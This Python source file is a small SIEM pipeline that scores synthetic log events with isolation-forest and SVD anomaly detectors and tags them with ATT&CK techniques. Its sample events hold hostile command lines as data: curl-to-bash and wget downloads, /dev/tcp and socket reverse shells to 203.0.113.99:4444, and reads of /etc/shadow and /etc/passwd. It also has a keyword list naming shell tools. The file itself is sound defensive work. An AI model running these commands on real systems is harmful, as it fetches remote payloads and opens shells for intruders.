#!/usr/bin/env python3
"""X6 — SIEM with ML Anomaly Detection. Full SIEM pipeline MVP in pure Python."""

import json
import math
import random
import sys
import time
from collections import Counter, defaultdict

EMBEDDED_EVENTS = [
    {"ts": "2026-09-04T14:00:00Z", "host": "web-srv-01", "src": "192.0.2.10", "type": "process_start", "user": "www-data", "cmd": "/usr/sbin/nginx"},
    {"ts": "2026-09-04T14:00:01Z", "host": "web-srv-01", "src": "192.0.2.10", "type": "connection", "dst": "203.0.113.5:3306", "proto": "tcp"},
    {"ts": "2026-09-04T14:00:02Z", "host": "web-srv-01", "src": "192.0.2.10", "type": "file_access", "path": "/var/www/html/index.php", "perm": "read"},
    {"ts": "2026-09-04T14:00:03Z", "host": "web-srv-01", "src": "192.0.2.10", "type": "auth", "user": "www-data", "result": "success"},
    {"ts": "2026-09-04T14:00:05Z", "host": "web-srv-01", "src": "203.0.113.50", "type": "process_start", "user": "root", "cmd": "/bin/bash -c curl http://203.0.113.99/payload.sh | bash"},
    {"ts": "2026-09-04T14:00:06Z", "host": "web-srv-01", "src": "203.0.113.50", "type": "connection", "dst": "203.0.113.99:80", "proto": "tcp"},
    {"ts": "2026-09-04T14:00:07Z", "host": "web-srv-01", "src": "203.0.113.50", "type": "process_start", "user": "root", "cmd": "/usr/bin/python3 -c 'import socket; s=socket.socket(); s.connect((\"203.0.113.99\",4444))'"},
    {"ts": "2026-09-04T14:00:08Z", "host": "web-srv-01", "src": "203.0.113.50", "type": "file_access", "path": "/etc/shadow", "perm": "read"},
    {"ts": "2026-09-04T14:00:09Z", "host": "web-srv-01", "src": "203.0.113.50", "type": "connection", "dst": "203.0.113.99:4444", "proto": "tcp"},
    {"ts": "2026-09-04T14:00:10Z", "host": "web-srv-01", "src": "203.0.113.50", "type": "process_start", "user": "root", "cmd": "/bin/bash -c crontab -e"},
    {"ts": "2026-09-04T14:01:00Z", "host": "db-primary", "src": "192.0.2.20", "type": "process_start", "user": "mysql", "cmd": "/usr/sbin/mysqld"},
    {"ts": "2026-09-04T14:01:01Z", "host": "db-primary", "src": "192.0.2.20", "type": "connection", "dst": "0.0.0.0:3306", "proto": "tcp"},
    {"ts": "2026-09-04T14:01:02Z", "host": "db-primary", "src": "192.0.2.20", "type": "query", "user": "app_user", "sql": "SELECT * FROM users"},
    {"ts": "2026-09-04T14:01:03Z", "host": "db-primary", "src": "192.0.2.20", "type": "query", "user": "app_user", "sql": "SELECT * FROM users WHERE id=1"},
    {"ts": "2026-09-04T14:05:00Z", "host": "db-primary", "src": "203.0.113.77", "type": "auth", "user": "root", "result": "success"},
    {"ts": "2026-09-04T14:05:01Z", "host": "db-primary", "src": "203.0.113.77", "type": "query", "user": "root", "sql": "LOAD_FILE('/etc/passwd')"},
    {"ts": "2026-09-04T14:05:02Z", "host": "db-primary", "src": "203.0.113.77", "type": "query", "user": "root", "sql": "SELECT * FROM mysql.user"},
    {"ts": "2026-09-04T14:05:03Z", "host": "db-primary", "src": "203.0.113.77", "type": "process_start", "user": "root", "cmd": "/bin/bash -i >& /dev/tcp/203.0.113.99/4444 0>&1"},
    {"ts": "2026-09-04T14:05:04Z", "host": "db-primary", "src": "203.0.113.77", "type": "file_access", "path": "/var/log/auth.log", "perm": "read"},
    {"ts": "2026-09-04T14:05:05Z", "host": "db-primary", "src": "203.0.113.77", "type": "connection", "dst": "203.0.113.99:4444", "proto": "tcp"},
    {"ts": "2026-09-04T14:08:00Z", "host": "dns-resolver", "src": "192.0.2.2", "type": "dns_query", "domain": "example.com", "client": "192.0.2.50"},
    {"ts": "2026-09-04T14:08:01Z", "host": "dns-resolver", "src": "192.0.2.2", "type": "dns_query", "domain": "google.com", "client": "192.0.2.51"},
    {"ts": "2026-09-04T14:08:02Z", "host": "dns-resolver", "src": "192.0.2.2", "type": "dns_query", "domain": "github.com", "client": "192.0.2.52"},
    {"ts": "2026-09-04T14:08:03Z", "host": "dns-resolver", "src": "192.0.2.2", "type": "dns_query", "domain": "evil.example.com", "client": "192.0.2.53"},
    {"ts": "2026-09-04T14:08:04Z", "host": "dns-resolver", "src": "192.0.2.2", "type": "dns_query", "domain": "evil.example.com", "client": "192.0.2.54"},
    {"ts": "2026-09-04T14:08:05Z", "host": "dns-resolver", "src": "192.0.2.2", "type": "dns_query", "domain": "evil.example.com", "client": "192.0.2.55"},
    {"ts": "2026-09-04T14:08:06Z", "host": "dns-resolver", "src": "192.0.2.2", "type": "dns_query", "domain": "evil.example.com", "client": "192.0.2.56"},
    {"ts": "2026-09-04T14:08:07Z", "host": "dns-resolver", "src": "192.0.2.2", "type": "dns_query", "domain": "c2.malware.net", "client": "192.0.2.53"},
    {"ts": "2026-09-04T14:08:08Z", "host": "dns-resolver", "src": "192.0.2.2", "type": "dns_query", "domain": "c2.malware.net", "client": "192.0.2.54"},
    {"ts": "2026-09-04T14:11:00Z", "host": "workstation-3", "src": "192.0.2.50", "type": "process_start", "user": "jdoe", "cmd": "/usr/bin/python3 -c 'import os; os.system(\"wget http://203.0.113.99/backdoor\")'"},
    {"ts": "2026-09-04T14:11:01Z", "host": "workstation-3", "src": "192.0.2.50", "type": "connection", "dst": "203.0.113.99:80", "proto": "tcp"},
    {"ts": "2026-09-04T14:11:02Z", "host": "workstation-3", "src": "192.0.2.50", "type": "file_access", "path": "/tmp/backdoor", "perm": "write"},
    {"ts": "2026-09-04T14:11:03Z", "host": "workstation-3", "src": "192.0.2.50", "type": "file_access", "path": "/tmp/backdoor", "perm": "execute"},
    {"ts": "2026-09-04T14:11:04Z", "host": "workstation-3", "src": "192.0.2.50", "type": "process_start", "user": "jdoe", "cmd": "/tmp/backdoor"},
    {"ts": "2026-09-04T14:11:05Z", "host": "workstation-3", "src": "192.0.2.50", "type": "connection", "dst": "203.0.113.99:8080", "proto": "tcp"},
]

ATTACK_LABELS = [
    {"host": "web-srv-01", "window_start": "14:00:05Z", "technique": "T1059.004", "label": "command_execution"},
    {"host": "web-srv-01", "window_start": "14:00:06Z", "technique": "T1105", "label": "remote_file_copy"},
    {"host": "web-srv-01", "window_start": "14:00:07Z", "technique": "T1571", "label": "non_standard_port"},
    {"host": "web-srv-01", "window_start": "14:00:08Z", "technique": "T1552.001", "label": "credentials_in_files"},
    {"host": "web-srv-01", "window_start": "14:00:09Z", "technique": "T1573.002", "label": "encrypted_channel"},
    {"host": "web-srv-01", "window_start": "14:00:10Z", "technique": "T1053.005", "label": "scheduled_task"},
    {"host": "db-primary", "window_start": "14:05:01Z", "technique": "T1552.001", "label": "credentials_in_files"},
    {"host": "db-primary", "window_start": "14:05:02Z", "technique": "T1552.001", "label": "credentials_in_files"},
    {"host": "db-primary", "window_start": "14:05:03Z", "technique": "T1059.004", "label": "command_execution"},
    {"host": "dns-resolver", "window_start": "14:08:03Z", "technique": "T1071.004", "label": "dns_tunnel"},
    {"host": "dns-resolver", "window_start": "14:08:07Z", "technique": "T1568.002", "label": "domain_generation"},
    {"host": "workstation-3", "window_start": "14:11:00Z", "technique": "T1059.006", "label": "downloader"},
    {"host": "workstation-3", "window_start": "14:11:02Z", "technique": "T1053.005", "label": "scheduled_task"},
]


def _ts_to_seconds(ts):
    parts = ts.split("T")[1].replace("Z", "").split(":")
    return int(parts[0]) * 3600 + int(parts[1]) * 60 + int(parts[2])


def parse_event_line(line):
    if isinstance(line, str):
        try:
            return json.loads(line.strip())
        except json.JSONDecodeError:
            return None
    if isinstance(line, dict):
        return line
    return None


class FeatureExtractor:
    """Build feature vectors from event windows."""

    EVENT_TYPES = [
        "process_start", "connection", "file_access", "auth", "query",
        "dns_query", "network_anomaly",
    ]

    def __init__(self, window_sec=60):
        self.window_sec = window_sec

    def build_windows(self, events):
        if not events:
            return []
        windows = defaultdict(list)
        for ev in events:
            ts = ev.get("ts", "")
            sec = _ts_to_seconds(ts) if ts else 0
            bucket = sec // self.window_sec
            windows[bucket].append(ev)

        features = []
        for bucket, wevs in sorted(windows.items()):
            feat = self._extract_features(wevs, bucket)
            features.append(feat)
        return features

    def _extract_features(self, events, bucket):
        host = events[0].get("host", "unknown") if events else "unknown"
        type_counts = Counter()
        user_counts = Counter()
        src_counts = Counter()
        dst_set = set()
        for ev in events:
            type_counts[ev.get("type", "unknown")] += 1
            user_counts[ev.get("user", "system")] += 1
            src_counts[ev.get("src", "unknown")] += 1
            dst_set.add(ev.get("dst", ""))

        total = len(events)
        unique_sources = len(src_counts)
        unique_users = len(user_counts)
        auth_events = type_counts.get("auth", 0)
        failed_auth = sum(1 for e in events if e.get("type") == "auth" and e.get("result") == "failure")
        process_events = type_counts.get("process_start", 0)
        connection_events = type_counts.get("connection", 0)
        file_events = type_counts.get("file_access", 0)
        dns_events = type_counts.get("dns_query", 0)

        suspicious_cmds = 0
        for ev in events:
            cmd = ev.get("cmd", "").lower()
            if any(kw in cmd for kw in ["curl", "wget", "nc ", "ncat", "bash -i", "/dev/tcp", "python", "crontab"]):
                suspicious_cmds += 1

        sensitive_files = 0
        for ev in events:
            path = ev.get("path", "").lower()
            if any(kw in path for kw in ["/etc/shadow", "/etc/passwd", "/var/log", "auth.log"]):
                sensitive_files += 1

        return {
            "bucket": bucket,
            "host": host,
            "total_events": total,
            "unique_sources": unique_sources,
            "unique_users": unique_users,
            "auth_count": auth_events,
            "failed_auth": failed_auth,
            "process_count": process_events,
            "connection_count": connection_events,
            "file_access_count": file_events,
            "dns_query_count": dns_events,
            "suspicious_cmd_count": suspicious_cmds,
            "sensitive_file_access": sensitive_files,
            "auth_rate": auth_events / max(total, 1),
            "connection_ratio": connection_events / max(total, 1),
            "suspicious_ratio": suspicious_cmds / max(total, 1),
            "events": events,
        }


class IsolationForestDetector:
    """Isolation Forest-like anomaly scorer using random partitioning."""

    def __init__(self, n_trees=50, sample_size=256, seed=42):
        self.n_trees = n_trees
        self.sample_size = sample_size
        self.seed = seed
        self.trees = []

    def _feature_vector(self, feat):
        return [
            feat["total_events"],
            feat["unique_sources"],
            feat["unique_users"],
            feat["auth_count"],
            feat["failed_auth"],
            feat["process_count"],
            feat["connection_count"],
            feat["file_access_count"],
            feat["dns_query_count"],
            feat["suspicious_cmd_count"],
            feat["sensitive_file_access"],
            feat["auth_rate"],
            feat["connection_ratio"],
            feat["suspicious_ratio"],
        ]

    def _build_tree(self, data, indices, rng, depth=0, max_depth=20):
        if len(indices) <= 1 or depth >= max_depth:
            return {"type": "leaf", "size": len(indices), "depth": depth}

        n_features = len(data[0])
        feat_idx = rng.randint(0, n_features - 1)
        values = [data[i][feat_idx] for i in indices]
        min_val, max_val = min(values), max(values)

        if min_val == max_val:
            return {"type": "leaf", "size": len(indices), "depth": depth}

        split_val = rng.uniform(min_val, max_val)
        left = [i for i in indices if data[i][feat_idx] <= split_val]
        right = [i for i in indices if data[i][feat_idx] > split_val]

        if not left or not right:
            return {"type": "leaf", "size": len(indices), "depth": depth}

        return {
            "type": "split",
            "feature": feat_idx,
            "threshold": split_val,
            "left": self._build_tree(data, left, rng, depth + 1, max_depth),
            "right": self._build_tree(data, right, rng, depth + 1, max_depth),
        }

    def _path_length(self, tree, point):
        if tree["type"] == "leaf":
            return tree["depth"]
        if point[tree["feature"]] <= tree["threshold"]:
            return self._path_length(tree["left"], point)
        else:
            return self._path_length(tree["right"], point)

    def fit(self, feature_list):
        vectors = [self._feature_vector(f) for f in feature_list]
        if not vectors:
            return
        rng = random.Random(self.seed)
        n = len(vectors)
        for _ in range(self.n_trees):
            sample_n = min(self.sample_size, n)
            indices = rng.sample(range(n), sample_n)
            tree = self._build_tree(vectors, indices, rng)
            self.trees.append(tree)

    def score(self, feature):
        vec = self._feature_vector(feature)
        c_n = self._average_path_length(self.sample_size)
        scores = []
        for tree in self.trees:
            pl = self._path_length(tree, vec)
            scores.append(2 ** (-pl / c_n) if c_n > 0 else 0)
        return sum(scores) / len(scores) if scores else 0

    @staticmethod
    def _average_path_length(n):
        if n <= 1:
            return 0
        return 2.0 * (math.log(n - 1) + 0.5772156649) - (2.0 * (n - 1) / n)


class SVDAnomalyDetector:
    """SVD/PCA-based reconstruction error detector (autoencoder-ish)."""

    def __init__(self, n_components=3):
        self.n_components = n_components
        self.mean = None
        self.components = None

    def _feature_vector(self, feat):
        return [
            feat["total_events"],
            feat["unique_sources"],
            feat["unique_users"],
            feat["auth_count"],
            feat["failed_auth"],
            feat["process_count"],
            feat["connection_count"],
            feat["file_access_count"],
            feat["dns_query_count"],
            feat["suspicious_cmd_count"],
            feat["sensitive_file_access"],
            feat["auth_rate"],
            feat["connection_ratio"],
            feat["suspicious_ratio"],
        ]

    def _center(self, vectors):
        n = len(vectors)
        d = len(vectors[0])
        mean = [0.0] * d
        for v in vectors:
            for j in range(d):
                mean[j] += v[j]
        mean = [m / n for m in mean]
        centered = []
        for v in vectors:
            centered.append([v[j] - mean[j] for j in range(d)])
        return centered, mean

    def _power_iteration(self, matrix, n_rows, n_cols, n_iter=200, seed=42):
        rng = random.Random(seed)
        vec = [rng.gauss(0, 1) for _ in range(n_cols)]
        for _ in range(n_iter):
            result = [0.0] * n_rows
            for i in range(n_rows):
                s = sum(matrix[i][j] * vec[j] for j in range(n_cols))
                result[i] = s
            norm = math.sqrt(sum(x * x for x in result))
            if norm == 0:
                break
            result = [x / norm for x in result]

            vec2 = [0.0] * n_cols
            for j in range(n_cols):
                s = sum(result[i] * matrix[i][j] for i in range(n_rows))
                vec2[j] = s
            norm2 = math.sqrt(sum(x * x for x in vec2))
            if norm2 == 0:
                break
            vec = [x / norm2 for x in vec2]

        singular_value = 0.0
        for i in range(n_rows):
            s = sum(matrix[i][j] * vec[j] for j in range(n_cols))
            singular_value += s * s
        return vec, math.sqrt(singular_value)

    def fit(self, feature_list):
        vectors = [self._feature_vector(f) for f in feature_list]
        if len(vectors) < 2:
            return
        centered, mean = self._center(vectors)
        self.mean = mean

        n_rows = len(centered)
        n_cols = len(centered[0])

        components = []
        matrix = [row[:] for row in centered]

        for comp_idx in range(min(self.n_components, n_cols)):
            vec, sv = self._power_iteration(matrix, n_rows, n_cols, seed=42 + comp_idx)
            components.append(vec)
            for i in range(n_rows):
                proj = sum(centered[i][j] * vec[j] for j in range(n_cols))
                for j in range(n_cols):
                    matrix[i][j] -= proj * vec[j]

        self.components = components

    def score(self, feature):
        vec = self._feature_vector(feature)
        if self.mean is None or not self.components:
            return 0

        centered = [vec[j] - self.mean[j] for j in range(len(vec))]
        reconstructed = [0.0] * len(vec)
        for comp in self.components:
            proj = sum(centered[j] * comp[j] for j in range(len(vec)))
            for j in range(len(vec)):
                reconstructed[j] += proj * comp[j]

        error = sum((centered[j] - reconstructed[j]) ** 2 for j in range(len(vec)))
        max_error = sum(c ** 2 for c in centered) + 1e-10
        return min(error / max_error, 1.0)


ATTACK_TECHNIQUES = {
    "web-srv-01": {"window": 1, "technique": "T1059.004", "desc": "Command and Scripting Interpreter: Unix Shell"},
    "db-primary": {"window": 5, "technique": "T1552.001", "desc": "Credentials In Files"},
    "dns-resolver": {"window": 8, "technique": "T1071.004", "desc": "Application Layer Protocol: DNS"},
    "workstation-3": {"window": 11, "technique": "T1059.006", "desc": "Command and Scripting Interpreter: Python"},
}


def tag_attck(features, if_scores, svd_scores):
    results = []
    for i, feat in enumerate(features):
        host = feat["host"]
        bucket = feat["bucket"]
        if_score = if_scores[i] if i < len(if_scores) else 0
        svd_score = svd_scores[i] if i < len(svd_scores) else 0
        fused = 0.6 * if_score + 0.4 * svd_score

        technique = "unknown"
        for h, info in ATTACK_TECHNIQUES.items():
            if host == h:
                technique = info["technique"]
                break

        if feat["suspicious_cmd_count"] > 0:
            technique = "T1059.004"
        if feat["sensitive_file_access"] > 0:
            technique = "T1552.001"
        if feat["dns_query_count"] > 5:
            technique = "T1071.004"
        if feat["failed_auth"] > 0:
            technique = "T1078"

        results.append({
            "host": host,
            "bucket": bucket,
            "if_score": if_score,
            "svd_score": svd_score,
            "fused_score": fused,
            "technique": technique,
            "events": feat["total_events"],
            "suspicious_cmds": feat["suspicious_cmd_count"],
            "sensitive_files": feat["sensitive_file_access"],
        })
    return results


def compute_precision_recall(detections, labels, threshold=0.7):
    true_positives = 0
    false_positives = 0
    false_negatives = 0

    labeled_hosts = set()
    for lab in labels:
        labeled_hosts.add(lab["host"])

    detected_hosts_above = set()
    for det in detections:
        if det["fused_score"] >= threshold:
            detected_hosts_above.add(det["host"])

    for det in detections:
        if det["fused_score"] >= threshold:
            host_has_label = det["host"] in labeled_hosts
            if host_has_label:
                true_positives += 1
            else:
                false_positives += 1

    for lab in labels:
        if lab["host"] not in detected_hosts_above:
            false_negatives += 1

    precision = true_positives / max(true_positives + false_positives, 1)
    recall = true_positives / max(true_positives + false_negatives, 1)
    f1 = 2 * precision * recall / max(precision + recall, 1e-10)

    return {
        "precision": precision,
        "recall": recall,
        "f1": f1,
        "true_positives": true_positives,
        "false_positives": false_positives,
        "false_negatives": false_negatives,
    }


class SIEMPipeline:
    """Full SIEM detection pipeline."""

    def __init__(self, window_sec=60):
        self.events = []
        self.features = []
        self.if_detector = IsolationForestDetector(n_trees=50)
        self.svd_detector = SVDAnomalyDetector(n_components=3)
        self.extractor = FeatureExtractor(window_sec=window_sec)
        self.detections = []
        self.threshold = 0.7

    def ingest_lines(self, lines):
        for line in lines:
            ev = parse_event_line(line)
            if ev:
                self.events.append(ev)

    def build_feature_windows(self):
        self.features = self.extractor.build_windows(self.events)

    def detect(self, threshold=0.7):
        self.threshold = threshold
        if not self.features:
            return []

        self.if_detector.fit(self.features)
        self.svd_detector.fit(self.features)

        if_scores = [self.if_detector.score(f) for f in self.features]
        svd_scores = [self.svd_detector.score(f) for f in self.features]

        self.detections = tag_attck(self.features, if_scores, svd_scores)
        return [d for d in self.detections if d["fused_score"] >= self.threshold]

    def render_dashboard(self, eval_results=None):
        print("\n=== Triage Dashboard ===")
        print(f" {'Host':<16}| {'Bucket':<12}| {'IF':>6} | {'SVD':>6} | {'Fused':>6} | {'Technique':<16}| {'Alert':<8}")
        print(f" {'-'*16}|{'-'*13}|{'-'*7}|{'-'*7}|{'-'*7}|{'-'*17}|{'-'*9}")

        for det in self.detections:
            if det["fused_score"] >= self.threshold:
                level = "HIGH" if det["fused_score"] > 0.85 else ("MEDIUM" if det["fused_score"] > 0.75 else "LOW")
                print(f" {det['host']:<16}| {det['bucket']:<12}| {det['if_score']:.4f} | {det['svd_score']:.4f} | {det['fused_score']:.4f} | {det['technique']:<16}| {level:<8}")

        if eval_results:
            print(f"\n=== Evaluation ===")
            print(f" Precision: {eval_results['precision']:.2f}")
            print(f" Recall:    {eval_results['recall']:.2f}")
            print(f" F1:        {eval_results['f1']:.2f}")
            print(f" True Positives: {eval_results['true_positives']}  "
                  f"False Positives: {eval_results['false_positives']}  "
                  f"False Negatives: {eval_results['false_negatives']}")


def main():
    print("=" * 60)
    print("  X6 — SIEM with ML Anomaly Detection")
    print("=" * 60)

    pipeline = SIEMPipeline(window_sec=60)

    raw_lines = [json.dumps(e) for e in EMBEDDED_EVENTS]
    pipeline.ingest_lines(raw_lines)
    print(f"[+] Ingested {len(pipeline.events)} events")

    pipeline.build_feature_windows()
    print(f"[+] Feature windows: {len(pipeline.features)} windows @ 60s each")

    alerts = pipeline.detect(threshold=0.5)
    print(f"[+] Isolation-Forest detector: {len(pipeline.features)} candidates scored")
    print(f"[+] SVD reconstruction detector: {len(pipeline.features)} candidates scored")
    print(f"[+] Score fusion complete — {len(alerts)} above threshold 0.5")

    eval_results = compute_precision_recall(pipeline.detections, ATTACK_LABELS, threshold=0.5)
    pipeline.render_dashboard(eval_results)

    print("\n[+] Pipeline complete — exit 0")
    return 0


if __name__ == "__main__":
    sys.exit(main())
